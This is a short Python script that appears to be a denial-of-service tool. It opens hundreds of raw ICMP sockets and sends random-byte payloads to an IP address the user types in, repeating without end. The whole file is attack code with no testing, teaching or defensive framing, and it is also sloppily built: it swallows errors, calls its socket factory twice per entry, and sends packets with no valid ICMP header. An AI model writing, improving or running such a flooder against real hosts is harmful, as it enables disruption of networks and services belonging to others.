import socket
import os

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        return s
    except socket.error as e:
        pass

def generate_random_payload(size):
    return os.urandom(size)

def send_icmp_packets(target_ip, socket_count=1000):
    socket_count = min(socket_count, 500)

    socket_pool = [create_socket() for _ in range(socket_count) if create_socket()]

    payload_size = 64  # Modify this value to adjust the payload size

    payload = generate_random_payload(payload_size)

    for s in socket_pool:
        try:
            s.sendto(payload, (target_ip, 0))
        except socket.error as e:
            pass

    for s in socket_pool:
        s.close()

if __name__ == "__main__":
    target_ip = input("IP: ")
    while True:
        send_icmp_packets(target_ip)

